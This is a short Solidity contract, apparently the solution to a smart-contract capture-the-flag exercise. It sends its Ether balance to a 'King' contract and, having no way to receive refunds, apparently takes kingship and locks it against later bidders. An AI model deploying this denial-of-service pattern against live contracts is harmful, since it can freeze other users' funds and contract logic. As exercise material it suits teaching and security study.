// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;
    King public kingContract;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
        kingContract = King(payable(contractAddress));
    }

    function hackContract() external {
        // // Code me!
        (bool success,) = address(kingContract).call{
            value: address(this).balance
        }("");
    }
}
